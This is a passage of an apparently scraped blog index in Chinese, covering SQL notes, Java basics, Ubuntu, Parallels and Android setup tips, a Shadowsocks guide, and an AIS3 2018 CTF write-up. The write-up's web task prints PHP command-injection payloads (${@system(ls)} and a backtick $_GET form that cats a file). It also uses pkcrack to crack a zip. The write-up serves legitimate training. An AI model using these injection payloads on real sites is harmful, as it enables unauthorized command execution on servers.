INTEGER;    My SQL / Oracle (prior version 10G) 1 2  ALTER TABLE celebs MODIFY COLUMN twitter_handle INTEGER;    Oracle 10G and later 1 2  ALTER TABLE celebs MODIFY twitter_handle INTEGER;       刪除資料 DELETE FROM\n1 2  DELETE FROM celebs WHERE twitter_handle IS NULL;   進階查詢語法 SELECT 查詢結果顯示 name, genre, year\n1 2  SELECT name, genre, year FROM movies;   AS 可以改變查詢結果的欄位名稱，但不會改掉資料表裡的欄位\n1 2  SELECT imdb_rating AS \u0026#39;IMDb\u0026#39; FROM movies;   SELECT DISTINCT 去掉的重複的查詢結果\n 去掉 year 重複的結果  1 2  SELECT DISTINCT year FROM movies;    去掉 year 和 name 都重複的結果  1 2  SELECT DISTINCT year, name FROM movies;   WHERE 篩選資料用的\n1 2 3  SELECT * FROM movies WHERE year \u0026gt; 2014;      運算子 作用     = 等於   != 不等於   \u0026gt; 大於   \u0026lt; 小於   \u0026gt;= 大於等於   \u0026lt;= 小於等於     「等於」要特別注意，只有一個等號\n LIKE 可以在 WHERE 子句中使用 LIKE 運算子來進行模糊搜尋\n1 2 3  SELECT * FROM movies WHERE name LIKE \u0026#39;Se_en\u0026#39;;    _ 代表任意字元\n 1 2 3  SELECT * FROM movies WHERE name LIKE \u0026#39;A%\u0026#39;;    A% 代表由 A 開頭 %A 代表由 A 結尾 %man% 代表所有含有 man 的字串  NULL NULL 不能拿來用運算子進行比較，因此出現 IS NULL、IS NOT NULL 來判斷是否是 NULL。\n 顯示具有 imdb_rating 的資料  1 2 3  SELECT name FROM movies WHERE imdb_rating IS NOT NULL;   BETWEEN 可以在 WHERE 子句中使用 BETWEEN 運算子來篩選出特定範圍區間得值\n篩選出 name 開頭為 \u0026lsquo;A\u0026rsquo;、\u0026lsquo;B\u0026rsquo;、\u0026lsquo;C\u0026rsquo; 的結果\n1 2 3  SELECT * FROM movies WHERE name BETWEEN \u0026#39;A\u0026#39; AND \u0026#39;D\u0026#39;;   篩選出 year 在 1990 ~ 1999 區間的結果\n1 2 3  SELECT * FROM movies WHERE year BETWEEN 1990 AND 1999;    BETWEEN 兩個字串，會不包含結尾 BETWEEN 兩個數字，會包含結尾的數字\n AND 1 2 3 4  SELECT * FROM movies WHERE year BETWEEN 1990 AND 1999 AND genre = \u0026#39;romance\u0026#39;;   OR 1 2 3 4  SELECT * FROM movies WHERE genre = \u0026#39;romance\u0026#39; OR genre = \u0026#39;comedy\u0026#39;;   ORDER BY 用來排序結果\n 如果 WHERE 存在，ORDER BY 永遠跟在 WHERE 後面\n  DESC：從大道小排序 ASC：從小到大排序（預設）  LIMIT 用來限制查詢結果數量\n1 2 3 4  SELECT * FROM movies ORDER BY imdb_rating DESC LIMIT 3;    永遠放在查詢語法最後面\n  不是所有 RDBMS（關聯式資料庫管理系統） 都有\n CASE SQL 中的判斷式，可以用在顯示結果加上新欄位\n CASE 通常在 SELECT 語句中\n  WHEN 後面接著條件式，如果條件式為真，會返回 THEN 後面的字串 ELSE 會在前面條件式都不符合的時候，返回一個字串 CASE 結尾一定要有一個 END 可以在 END 後面接 AS 來簡稱該條件的欄位名稱  1 2 3 4 5 6 7  SELECT name, CASE WHEN genre = \u0026#39;romance\u0026#39; THEN \u0026#39;Chill\u0026#39; WHEN genre = \u0026#39;comedy\u0026#39; THEN \u0026#39;Chill\u0026#39; ELSE \u0026#39;Intense\u0026#39; END AS \u0026#39;Mood\u0026#39; FROM movies;   計算函式 Count 計算指定欄位非空資料的總數\n1 2 3  SELECT COUNT(*) FROM fake_apps WHERE price = 0;   SUM 加總指定欄位的值\n1 2  SELECT SUM(downloads) FROM fake_apps;   MAX / MIN 求指定欄位的最大或最小值\n1 2  SELECT MIN(downloads) FROM fake_apps;   AVERAGE 求指定欄位的平均值\n1 2  SELECT AVG(price) FROM fake_apps;   ROUND 將指定資料四捨五入\n1 2  SELECT ROUND(AVG(price), 2) FROM fake_apps;   彙總函式 GROUP BY 用來搭配 SELECT 語句，將指定欄位中，相同資料的放在一組，以便計算函式以組為單位進行計算\n GROUP BY 會出現在 WHERE 之後，ORDER BY 和 LIMIT 之前\n 1 2 3  SELECT category, SUM(downloads) FROM fake_apps GROUP BY category;   GROUP BY 後面的參數可以接數字，從 1 開始，分別代表 SELECT 後面的第幾個值\n1 2 3 4 5  SELECT category, price, AVG(downloads) FROM fake_apps GROUP BY 1, 2;   以上面的例子來說，GROUP BY 後面的 1、2 分別指向 category 和 price\nHAVING 與 WHERE 類似，不過他是針對 Group\n HAVING 會出現在 GROUP BY 之後，ORDER BY 和 LIMIT 之前\n 1 2 3 4 5 6  SELECT price, ROUND(AVG(downloads)), COUNT(*) FROM fake_apps GROUP BY price HAVING COUNT(*) \u0026gt; 10;   表格連接 JOIN 使用方法：JOIN 表格名稱 ON 連接欄位規則\n 連接後會自動補 NULL\n 1 2 3 4 5  SELECT * FROM orders JOIN customers ON orders.customer_id = customers.customer_id;   INNER JOIN 使用方法：INNER JOIN 表格名稱 ON 連接欄位規則\n 會自動將不符合連接欄位規則的部分捨棄，如下圖\n 1 2 3 4  SELECT COUNT(*) FROM newspaper JOIN online ON newspaper.id = online.id;   ","permalink":"https://blackmaple.me/sql-tutorial/","summary":"\u003ch2 id=\"基本語法\"\u003e基本語法\u003c/h2\u003e\n\u003ch3 id=\"創建資料表\"\u003e創建資料表\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eCREATE TABLE\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003eCREATE TABLE table_name (\n   column_1 data_type, \n   column_2 data_type, \n   column_3 data_type\n);\n\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003eCREATE TABLE celebs (\n    id INTEGER,\n    name TEXT, \n    age INTEGER\n);\n\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e6\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003eCREATE TABLE celebs (\n   id INTEGER PRIMARY KEY, \n   name TEXT UNIQUE,\n   date_of_birth TEXT NOT NULL,\n   date_of_death TEXT DEFAULT \u0026#39;Not Applicable\u0026#39;,\n);\n\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ePRIMARY KEY\u003c/code\u003e：可用於資料的唯一識別，不能重複，一個資料只能有一個欄位是 \u003ccode\u003ePRIMARY KEY\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eUNIQUE\u003c/code\u003e：與 \u003ccode\u003ePRIMARY KEY\u003c/code\u003e 很像，不過它可以設置在一個資料的多個欄位\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eNOT NULL\u003c/code\u003e：強制該欄位一定要給定值\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eDEFAULT\u003c/code\u003e：如果欄位沒有值，會自動定預設值\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"SQL 語法筆記"},{"content":"今年第二次參加 AIS3 pre-exam 的感想\n 要用到程式解的地方滿多的 Web2 對網路環境不好的人會跑很久 Misc2 超多假 flag，要找到真的根本要通靈＝＝  Web 1. warmup   打開 開發者工具，可以看到 response headers 裡面有奇怪的 Partial-Flag   再看看網址列上有奇怪的參數，嘗試去改改看它，會發現 partial flag 跟著變了   再仔細觀察一下，發現前四個 partial flag 是 AIS3，所以可以知道 partial flag 組合起來就是這題的 flag 了。\n  但這題 flag 有點長，所以我用 Python 來解\n1 2 3 4 5 6 7 8  import requests for i in range(50): r = requests.get(\u0026#34;http://104.199.235.135:31331/index.php?p={}\u0026#34;.format(i)) key = r.headers[\u0026#39;Partial-Flag\u0026#39;] if key == \u0026#39;\u0026#39;: print(\u0026#39; \u0026#39;, end=\u0026#39;\u0026#39;) else: print(key, end=\u0026#39;\u0026#39;)     2. hidden   打開網頁就看到這行字   因為看到上面顯示的文字，所以想到 secret page 可能藏在 robots.txt 裡   進到 _hidden_flag_.php 頁面之後，發現還是沒有看到 flag。   打開 開發者工具 查看 HTML，發現按鈕會送出奇怪的 form-data。   按了幾次按鈕後，會發現 c 不斷的再增加， s 也跟著變   透過 開發者工具 的看看 response，發現了奇怪的假 flag   拿 Python 去跑跑看，跑到幾萬後會發現 response 的 Flag 變了，flag 就出來的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import requests from bs4 import BeautifulSoup payload = {\u0026#39;c\u0026#39;: \u0026#34;1\u0026#34;, \u0026#39;s\u0026#39;: \u0026#39;3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb\u0026#39;} while True: r = requests.post(\u0026#39;http://104.199.235.135:31332/_hidden_flag_.php\u0026#39;, payload) soup = BeautifulSoup(r.content, \u0026#34;html.parser\u0026#34;) print(r.headers) f = open(\u0026#39;ans.txt\u0026#39;, \u0026#39;a\u0026#39;) f.write(str(r.headers)+\u0026#34;\\n\u0026#34;) if \u0026#39;AIS3{NOT_A_VALID_FLAG}\u0026#39; not in str(r.headers): break c = soup.find(\u0026#34;input\u0026#34;, {\u0026#34;name\u0026#34;:\u0026#39;c\u0026#39;})[\u0026#39;value\u0026#39;] s = soup.find(\u0026#34;input\u0026#34;, {\u0026#34;name\u0026#34;:\u0026#39;s\u0026#39;})[\u0026#39;value\u0026#39;] payload = {\u0026#39;c\u0026#39;: c, \u0026#39;s\u0026#39;: s}     3. sushi 這題查了一下資料，嘗試很多次，最後發現考的好像是 php double quote\n  可以印出當前檔案目錄\n1  http://104.199.235.135:31333/?🍣=${@system(ls)}     因為這題 .htaccess 沒有限制，所以可以直接訪問 flag\n1  http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ     不過如果有限制，可以利用下面的解法來印出 flag\n1  http://104.199.235.135:31333/?🍣=\u0026#34;.`$_GET[1]`.\u0026#34;\u0026amp;1=cat flag_name_1s_t00_l0ng_QAQQQQQQ     Reverse 1. find 這題只是將 flag 藏在檔案中，可以用記事本或是編輯器打開，用 ctrl+f 很快就能找到了。\n 如果是用 linux 或 mac 有更快的解法   3. crackme   猜測這是用 .NET 寫的，所以用 dnSpy 來打開它\n  在 MainWindow 中看到疑似 flag 的東西   發現 secret 是用 XOR 加密然後轉成 int   用 Python 來解\n1 2 3 4  #!/usr/bin/env python3 list = [234, 226, 248, 152, 208, 154, 223, 244, 226, 158, 244, 238, 234, 216, 210, 244, 223, 228, 244, 232, 249, 159, 200, 192, 244, 230, 206, 138, 214] for i in list: print(chr(i^171), end=\u0026#39;\u0026#39;)     Misc 1. welcome 送分題，看影片拿 flag\n2. flags 這題可以找到 3 個假 flag，要找到真 flag 根本要通靈＝＝\n  用編輯器開他，會發現有假 flag 藏在其中\n  將檔名改成 jpg，會看到圖片上面顯示著假 flag   用 binwalk 去分析檔案，會發現其中藏著 zip   用 dd 把其中的 zip 拆出來\n1  dd if=flags.jpg of=flag skip=48932 bs=1     拆出來的 zip 有密碼，所以用 pkcrack 來破解\n1  pkcrack -c backup/Avengers_Infinity_War_Poster.jpg -p Avengers_Infinity_War_Poster.jpg -C flag.zip -P photo.zip     破解完後拿到裡面的 flag 檔，發現還是假的＝＝\n  最後透過主辦方給出的提示，回到第二步那張圖，盯了老半天，發現那個框框藏有摩斯密碼\u0026hellip;   Crypto 1. POW 這題考的就是 proof of work\n 用 Python 暴力去運算比對是否符合條件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #!/usr/bin/env python3 import itertools import string from hashlib import * from pwn import * r = remote(\u0026#39;104.199.235.135\u0026#39;, 20000) r.recvuntil(\u0026#34;condition : x[:6] == \u0026#39;\u0026#34;) cond = r.recvuntil(\u0026#34;\u0026#39;\u0026#34;).decode(\u0026#39;ascii\u0026#39;).rstrip(\u0026#34;\u0026#39;\u0026#34;) r.recvuntil(\u0026#39;x = \u0026#39;) ans = \u0026#39;\u0026#39; alphanumeric = string.ascii_uppercase + string.ascii_lowercase + string.digits for s in itertools.product(alphanumeric, repeat=4): if sha256((\u0026#39;%s%s\u0026#39;%(cond, \u0026#39;\u0026#39;.join(s))).encode(\u0026#39;utf-8\u0026#39;)).hexdigest().startswith(\u0026#39;000000\u0026#39;): ans = cond + \u0026#39;\u0026#39;.join(s) break r.sendline(ans) r.interactive()    ","permalink":"https://blackmaple.me/ais3-2018-write-up/","summary":"\u003cp\u003e今年第二次參加 AIS3 pre-exam 的感想\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e要用到程式解的地方滿多的\u003c/li\u003e\n\u003cli\u003eWeb2 對網路環境不好的人會跑很久\u003c/li\u003e\n\u003cli\u003eMisc2 超多假 flag，要找到真的根本要通靈＝＝\u003c/li\u003e\n\u003c/ul\u003e","title":"AIS3 2018 write-up"},{"content":" 點擊「系統設定值」的按鈕    點擊「語言支援」   第一次打開，會跳出「安裝語言尚未支援完備」，這邊點擊「安裝」   這邊會讓你輸入你剛剛設定的密碼，並等待安裝完畢   安裝完後重新開機   開機完後點右上角的鍵盤圖示，然後點選「ConfigureFcitx」   點選左下角的「＋」來新增輸入法   這邊推薦安裝「新酷音」   安裝完後可以在輸入法列表裡看到你剛剛選擇的輸入法，這邊可以調整輸入法順序  ","permalink":"https://blackmaple.me/%E5%9C%A8ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/","summary":"\u003col\u003e\n\u003cli\u003e點擊「系統設定值」的按鈕\n\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/8weBEw1.jpg\" alt=\"\"  /\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"在 Ubuntu 上安裝中文輸入法"},{"content":"安裝 Parallels Desktop Lite 到 Mac App Store 上面可以找到\n安裝 Ubuntu 16.04   開啟 Parallels Desktop Lite   安裝 Ubuntu   選取你下載的 Ubuntu 映像檔，並點擊繼續   取消勾選『快速安裝』，並點擊繼續   勾選安裝前設定，可以社設定虛擬機配置   點擊配置已設定虛擬機，然後點擊繼續來開始安裝   選擇語言   選擇「安裝 Ubuntu」（如果想先試用，但不安裝，可以點第一項）   選擇安裝過程的語言   建議全部勾選，也可以選擇自己想要的勾選   如果是在虛擬機中安裝，不需分隔磁碟，直接選第一個，然後按「立即安裝」   點擊「繼續」開始安裝   選擇時區   選擇鍵盤排列方試（台灣鍵盤為美式鍵盤）   輸入使用者帳戶資訊   等待安裝並重新開機\n   註：如果重新開機失敗，可以點選下圖的重新啟動  Parellels 解析度調整   重新開機後，點擊 Parallels 上方的操作選單，並點擊安裝 Parallels Tools，依照指示完成安裝。   確認螢幕設定為「縮放」   點擊「系統設定值」的按鈕   點擊「顯示器」   在這裡可以調整螢幕的解析度（Macbook 建議調成 1440x900）  ","permalink":"https://blackmaple.me/%E4%BD%BF%E7%94%A8-parallels-desktop-lite-%E5%AE%89%E8%A3%9D-ubuntu-16-04macos/","summary":"\u003ch2 id=\"安裝-parallels-desktop-lite\"\u003e安裝 Parallels Desktop Lite\u003c/h2\u003e\n\u003cp\u003e到 \u003ca href=\"https://itunes.apple.com/tw/app/parallels-desktop-lite/id1085114709\"\u003eMac App Store\u003c/a\u003e 上面可以找到\u003c/p\u003e","title":"使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）"},{"content":"為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。\n條件式 「如果OOO成立，就要…」，Java提供了 if...else 條件式，語法如下：\nif\u0026hellip;else 1 2 3 4 5 6 7  if (條件式一) { 陳述句; } else if (條件式二) { 陳述句; } else { 陳述句; }   條件式運算結果為 true 會執行 if 的 { 與 } 中的陳述句，否則執行下一個條件式，如果所有條件是都不符合，則執行 else 的 { 與 } 中的陳述句，如果條件式不成立時並不想作任何事，則 else 可以省略。\nswitch 1 2 3 4 5 6 7 8 9 10  switch (變數或運算式) { case 整數、字元、字串: 陳述句; break; case 整數、字元、字串: 陳述句; break; default: 陳述句; }   首先看看 switch 的括號，當中置放要取得值的變數或運算式，值必須是整數、字元、字串，取得值後會開始與 case 中設定的整數、字元、字串比對，如果符合就執行之後的陳述句，直到遇到 break，則離開 switch 區塊，如果沒有符合的整數、字元、字串，則會執行 default 後的陳述句，default 不一定需要，如果沒有預設要處理的動作，可以省略 default。\n迴圈 在 Java 中如果要進行重複性指令執行，可以使用 for 迴圈式或 while 迴圈\nfor 1 2 3  for (初始式; 執行結果必須是boolean的重複式; 重複式) { 陳述句; }   while 1 2 3  while (條件式) { 陳述句; }   do\u0026hellip;while 1 2 3  do { 陳述句; } while (條件式);   break 跳出迴圈\ncontinue 進行下一次迴圈\n","permalink":"https://blackmaple.me/%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%88%87%E8%BF%B4%E5%9C%88-java/","summary":"\u003cp\u003e為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。\u003c/p\u003e\n\u003ch2 id=\"條件式\"\u003e條件式\u003c/h2\u003e\n\u003cp\u003e「如果OOO成立，就要…」，Java提供了 \u003ccode\u003eif...else\u003c/code\u003e 條件式，語法如下：\u003c/p\u003e","title":"條件式與迴圈 - Java"},{"content":"資料型態 何謂資料型態？ 程式儲存資料的型態\n認識資料型態 常常聽到別人提到 Java 是物件導向語言，不過 Java 本身並不是純綷的物件導向語言，像是就型態系統而言，Java 就並非每個值都是物件，而是混合了兩個型態系統：基本型態（Primitive type）與物件型態（Object type）。\n基本型態（Primitive type） 在 Java 語言中有八種基本型態( Primitive Type )，可分作四個大類\n 整數型態：byte、short、int、long 浮點數型態：float、double 字元型態：char 邏輯型態：boolean  整數型態 用於儲存整數\n   型態 長度 範圍     byte 8 bits −2^7^到2^7^−1   short 16 bits −2^15^到2^15^−1   int 32 bits −2^31^到2^31^−1   long 64 bits −2^63^到2^63^−1    浮點數型態 用於儲存小數，double浮點數使用的記憶體空間比float浮點數來得多，可表示的精確度也比較大。想要了解確切的範圍，可以自行Google\n   型態 長度     float 32 bits   double 64 bits    字元型態 char型態用來儲存'A'、'B'、'林'等字元符號。每個字元型態佔兩個位元組，中文字元與英文字元在Java中同樣都是用兩個位元組儲存。\n布林型態 boolean型態可儲存true與false，分別代表邏輯的「真」與「假」。\n變數 不懂變數概念的可以參考這篇，https://openhome.cc/Gossip/Java/Variable.html\n變數命名規則 類別以英文大寫字母開頭，若有多個英文單字組成，採取大寫駝峰型 (upper camel case)\n SampleItem MyData MySimpleThread MainActivity  方法或變數（包括參數、屬性等）以英文小寫字母開頭，若有多個英文單字組成，採取小寫駝峰型 (lower camel case)\n setUpNetworking getView myActivity  運算子 單元運算子    運算子 功能 範例     + 正 +a   - 負 -a   ++ 遞增 ++a, a++   -- 遞減 --a, a--   ! 反轉 !a    1 2 3  boolean a = true; boolean b = !a; // b 會等於 false boolean c = !b; // c 會等於 true   一般運算子 下面為一般運算子，皆須結合兩個運算元，可用在整數及浮點數，計算結果為整數或浮點數\n   運算子 功能 範例     + 加 a + b   - 減 a - b   * 乘 a * b   / 除 a / b   % 取餘數 a % b    關係運算子 下面為關係運算子，計算結果不是true就是false\n   運算子 功能 範例     == 相等 a == b   != 不相等 a != b   \u0026gt; 大於 a \u0026gt; b   \u0026gt;= 大於等於 a \u0026gt;= b   \u0026lt; 小於 a \u0026lt; b   \u0026lt;= 小於等於 a \u0026lt;= b    指派運算子    運算子 功能 範例     = 指派 a = b   += 相加同時指派 a += b   -= 相減同時指派 a -= b   *= 相乘同時指派 a *= b   /= 相除同時指派 a /= b   %= 取餘數同時指派 a %= b   ","permalink":"https://blackmaple.me/%E5%9E%8B%E6%85%8B%E8%AE%8A%E6%95%B8%E8%88%87%E9%81%8B%E7%AE%97%E5%AD%90-java/","summary":"\u003ch2 id=\"資料型態\"\u003e資料型態\u003c/h2\u003e\n\u003ch3 id=\"何謂資料型態\"\u003e何謂資料型態？\u003c/h3\u003e\n\u003cp\u003e程式儲存資料的型態\u003c/p\u003e","title":"型態、變數與運算子 - Java"},{"content":"紀錄 1 問題 在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。 \u0008\n原因 OkHttp 不是執行在 UI Thread，但 Retrofit 是。\n紀錄 2 問題 在 OkHttp 的 on\u0008Response 中使用 Toast 會噴錯。\n\u0008原因 OkHttp 不是執行在\u0008 UI Thread。\n解法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // 解法1 Handler handler = new Handler(Looper.getMainLooper()); handler.post(new Runnable() { @Override public void run() { // TODO  } }); // 解法2 activity.runOnUiThread(new Runnable() { @Override public void run() { } });   ","permalink":"https://blackmaple.me/android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/","summary":"\u003ch2 id=\"紀錄-1\"\u003e紀錄 1\u003c/h2\u003e\n\u003ch3 id=\"問題\"\u003e問題\u003c/h3\u003e\n\u003cp\u003e在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。\n\u0008\u003c/p\u003e","title":"Android 學習問題紀錄"},{"content":"這邊教大家如何使用 ShadowsocksX-NG 來進行 Shadowsocks 代理，以達到 翻牆 效果。\n下載 ShadowsocksX-NG GitHub 載點：https://github.com/shadowsocks/ShadowsocksX-NG/releases/\n編輯代理伺服器 點擊「紙飛機」選擇「Server」，然後點擊【Server Preferences\u0026hellip;】選項：\n新增 Shadowsocks 服務配置：\n更改代理模式 預設模式為 Proxy Auto Configure Mode，這邊我們將它改為 Global Mode，使所有對外連線都使用 Shadowsocks，且無需特別設定。\n如要使用 Proxy Auto Configure Mode，會需要額外設定，這邊就不多做敘述。\n測試是否成功 訪問 orange.tw 來查看自己的 IP 是否有變更。\n關閉 Shadowsocks 點擊【Turn Shadowsocks Off】來關閉 Shadowsocks。\n","permalink":"https://blackmaple.me/mac%E4%B8%8B%E4%BD%BF%E7%94%A8shadowsocks%E7%BF%BB%E7%89%86/","summary":"這邊教大家如何使用 ShadowsocksX-NG 來進行 Shadowsocks 代理，以達到 翻牆 效果。\n下載 ShadowsocksX-NG GitHub 載點：https://github.com/shadowsocks/ShadowsocksX-NG/releases/\n編輯代理伺服器 點擊「紙飛機」選擇「Server」，然後點擊【Server Preferences\u0026hellip;】選項：\n新增 Shadowsocks 服務配置：\n更改代理模式 預設模式為 Proxy Auto Configure Mode，這邊我們將它改為 Global Mode，使所有對外連線都使用 Shadowsocks，且無需特別設定。\n如要使用 Proxy Auto Configure Mode，會需要額外設定，這邊就不多做敘述。\n測試是否成功 訪問 orange.tw 來查看自己的 IP 是否有變更。\n關閉 Shadowsocks 點擊【Turn Shadowsocks Off】來關閉 Shadowsocks。","title":"Mac 下使用 Shadowsocks 翻牆"},{"content":"在 Android 介面設計中，常會用到 android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。\nandroid:gravity 是作用在 view 裡的內容．比如一個 button 上面的 text。你可以設置該 text 在 view 裡是靠左、靠右等位置。\nandroid:layout_gravity 是用來設置該 view 相對於父 view 的位置。比如一個 button 在 LinearLayout 裡，你想讓該 button 在 LinearLayout 裡是靠左、靠右等位置。\n","permalink":"https://blackmaple.me/android-gravity%E5%92%8Candroid-layout-gravity%E7%9A%84%E5%B7%AE%E5%88%A5/","summary":"\u003cp\u003e在 Android 介面設計中，常會用到  android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。\u003c/p\u003e","title":"android:gravity 和 android:layout_gravity 的差別"},{"content":"問題描述 在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。\n解決辦法 上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。 因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：\n1  /Applications/Android\\ Studio.app/Contents/bin/studio.vmoptions   在我的電腦上，參數預設是：\n1 2 3 4  -Xms256m -Xmx1280m -XX:ReservedCodeCacheSize=240m -XX:+UseCompressedOops   在修改重要設定檔之前，建議先做備份：\n1 2  cd /Applications/Android\\ Studio.app/Contents/bin/ cp studio.vmoptions studio.vmoptions.bak   以上為 bash 指令，請打開 terminal 輸入。\n第一句是移動到存放 studio.vmoptions 的資料夾底下 第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak\n然後修改 studio.vmoptions 成這樣：\n1 2 3 4  -Xms512m -Xmx2048m -XX:ReservedCodeCacheSize=768m -XX:+UseCompressedOops   如果覺得你記憶體足夠大，可以將 -Xmx 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。\n","permalink":"https://blackmaple.me/%E8%A7%A3%E6%B1%BAandroid-studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/","summary":"問題描述 在使用 Macbook Pro 13 2017 